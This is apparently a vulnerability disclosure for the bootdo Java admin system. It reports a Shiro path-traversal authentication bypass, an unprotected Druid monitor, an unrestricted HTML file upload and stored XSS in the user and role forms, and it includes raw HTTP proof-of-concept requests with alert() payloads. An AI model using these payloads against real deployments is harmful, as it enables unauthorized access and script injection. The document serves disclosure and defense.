# Project

Address: [bootdo](https://github.com/lcg0124/bootdo)

# 1. Permission bypass vulnerability

[Suggested description]

Because the shiro component version is too low, an attacker can directly bypass permission verification and launch an attack on the system.

[Vendor of Product]

https://github.com/lcg0124/bootdo.git

[Affected Product Code Base]

ALL

[Affected Component]

All interfaces

[Bypass payload]

`/demo/..;/admin/index`

[Vulnerability recurrence]

Bypass permission verification and obtain system data directly: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d30ffc10-d166-4a99-830f-fd23061c3b6f)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/7b67d11f-7570-4e8f-b3e7-4ec25a57c4c1)

[Code analysis]

The shrio version is too early, resulting in the CVE-2020-1957 authentication bypass vulnerability

![1705235868562](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9c3a7763-7eac-4125-9a9a-55e2fae7720f)

# 2 Druid is not authorized

[Suggested description]

Since no password is set for the durid component, you can directly access the interface: /druid/index.html to get all the data in the durid monitor

[Vendor of Product]

https://github.com/lcg0124/bootdo.git

[Affected Product Code Base]

ALL

[Affected Component]

/druid/index.html

[Vulnerability recurrence]

Access the `/druid/index.html` interface directly to bypass permission verification

![1705240291221](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/330e4556-b2d4-4860-8af4-f341515e003c)

![1705240299228](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f61f40c2-2227-43dc-bd93-f19ef308d971)

# 3. Arbitrary file upload

[Suggested description]

Because the file suffix is not restricted, a malicious html file can be uploaded, triggering a stored XSS vulnerability

[Vendor of Product]

https://github.com/lcg0124/bootdo.git

[Affected Product Code Base]

ALL

[Affected Component]

/common/sysFile/upload

POC

```
POST /common/sysFile/upload HTTP/1.1
Host: localhost:8080
Content-Length: 223
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2tlfWmBNl9XQwAKN
Cookie: JSESSIONID=e615ff5a-3a8a-4c09-8a8f-51bd71c7d5b6
Connection: close

------WebKitFormBoundary2tlfWmBNl9XQwAKN
Content-Disposition: form-data; name="file"; filename="hello.html"
Content-Type: application/octet-stream

<script>alert(1)</script>
------WebKitFormBoundary2tlfWmBNl9XQwAKN--
```

[Vulnerability recurrence]

![205f74697ba7c67786880234cf33e63](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/2f2795c4-78d9-4487-84ea-a223e1d20567)

![107437b27c1a335d0504762c4c9feb2](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/fbedcb82-103f-4348-a06a-4b68c6fdc3fd)

[Code analysis]

1. Get the filename: 

![1705240677737](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/69969270-507f-4311-a2a2-662f954918a7)

2. Filenames are processed in FileUtil.renameToUUID(): 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/20abf665-e2fc-483e-aff0-a537fedeb099)

3. No filtering of suffixes, only simple splicing: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/1d2a05a0-439d-4927-8b0f-358c09e76d21)

4. File upload: 

![1705240859928](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/5ccb2aa3-c739-4e17-b09e-cd7ae3feff20)

# 4. Stored cross-site scripting

## 4.1 Stored cross-site scripting `/sys/user/save`

[Suggested description]

There is a risk at interface: `/sys/user/save` that code execution is triggered when a user accesses the page. This kind of XSS is more dangerous, easy to cause worms, cookie theft, etc.

[Vendor of Product]

https://github.com/lcg0124/bootdo.git

[Affected Product Code Base]

ALL

[Affected Component]

/sys/user/save

[The payload]

```
POST /sys/user/save HTTP/1.1
Host: localhost:8080
Content-Length: 208
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: jfinalLayuiId=5aff469299ee473a98764979fd1747a6; Hm_lvt_1040d081eea13b44d84a4af639640d51=1704700615; SECKEY_ABVK=QB0muBZKIhj/x2U0crrzjRFKqLLsxcCPQeERTxZL83w%3D; BMAP_SECKEY=vZ06ujrbustvfw0As8Yuso1fJ4KuZsxC6bS4L3cN2Ju3nBxucpxE3zWL0Icj5XgT6UEowgcPcHBoZp-pTRA7A98arGr6TDi9YHZ5p2qi5HzVg6jf5nWqCiZ2qUZi2WFRVg0ZrsYCgcMSK6bBLoABKj0fY3QroLu-SvzC4Z6xDnn2XlrQomcnGj1kejinihGt7agGYEyjRLyRxR_sf5_rVg; theSkin=layui-blue; JSESSIONID=e615ff5a-3a8a-4c09-8a8f-51bd71c7d5b6
Connection: close

userId=&name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&username=%3Cscript%3Ealert(2)%3C%2Fscript%3E&password=123456&deptId=&deptName=&email=%3Cscript%3Ealert(3)%3C%2Fscript%3Etest%40qq.com&status=1&roleIds=1&role=1
```

[Vulnerability recurrence]

The location of the vulnerability is under `System Management` -> `User Management`, the vulnerability parameter is `name`, `username` and `email`:

![3cc2400baabf88bbe2b03760397dc23](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c1e743d0-cab8-4ac5-8a16-a0cb7d3f8bab)

![c026a80295241c7c076269ba903e0ee](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/016cd182-993a-4879-a2e4-5ca39646315c)

![1705241495731](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/67910eb6-e2f1-4f83-a893-1f4bd4bfef9f)

![1705241516648](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/09234993-8075-44da-8422-eb3d874cfd23)

![1705241521948](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/a15176ac-d397-41e8-b88e-ba99214edd30)

## 4.2 Stored cross-site scripting `/sys/menu/tree`

[Suggested description]

There is a risk at interface: `/sys/menu/tree` that code execution is triggered when a user accesses the page. This kind of XSS is more dangerous, easy to cause worms, cookie theft, etc.

[Vendor of Product]

https://github.com/lcg0124/bootdo.git

[Affected Product Code Base]

ALL

[Affected Component]

/sys/menu/tree

[The payload]

```
POST /sys/role/save HTTP/1.1
Host: localhost:8080
Content-Length: 413
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: jfinalLayuiId=5aff469299ee473a98764979fd1747a6; Hm_lvt_1040d081eea13b44d84a4af639640d51=1704700615; SECKEY_ABVK=QB0muBZKIhj/x2U0crrzjRFKqLLsxcCPQeERTxZL83w%3D; BMAP_SECKEY=vZ06ujrbustvfw0As8Yuso1fJ4KuZsxC6bS4L3cN2Ju3nBxucpxE3zWL0Icj5XgT6UEowgcPcHBoZp-pTRA7A98arGr6TDi9YHZ5p2qi5HzVg6jf5nWqCiZ2qUZi2WFRVg0ZrsYCgcMSK6bBLoABKj0fY3QroLu-SvzC4Z6xDnn2XlrQomcnGj1kejinihGt7agGYEyjRLyRxR_sf5_rVg; theSkin=layui-blue; JSESSIONID=e615ff5a-3a8a-4c09-8a8f-51bd71c7d5b6
Connection: close

userId=&menuIds=-1%2C98%2C99%2C95%2C101%2C96%2C94%2C30%2C29%2C28%2C92%2C57%2C27%2C89%2C88%2C87%2C86%2C90%2C85%2C72%2C48%2C60%2C59%2C58%2C51%2C68%2C50%2C76%2C75%2C74%2C62%2C56%2C55%2C15%2C26%2C25%2C24%2C14%2C13%2C12%2C61%2C22%2C21%2C20%2C73%2C7%2C6%2C2%2C83%2C81%2C80%2C79%2C78%2C71%2C102%2C97%2C93%2C91%2C84%2C77%2C49%2C3%2C1&roleName=%3Cscript%3Ealert(1)%3C%2Fscript%3E&remark=%3Cscript%3Ealert(2)%3C%2Fscript%3E
```

[Vulnerability recurrence]

The location of the vulnerability is under `System Management` -> `Role management`, the vulnerability parameter is `roleName` and `remark`:

![3cc2400baabf88bbe2b03760397dc23](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/83c2da06-2612-45cc-b0f0-3b80f1953b5a)

![1705242267293](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/ed161630-34df-44c6-b005-3c82fece1485)

![1705242053654](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/4093a8d9-544a-48db-b46a-28b708bc7446)

![1705242059323](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/eb468355-dcf4-44e6-b5ac-0cfa337a31d9)
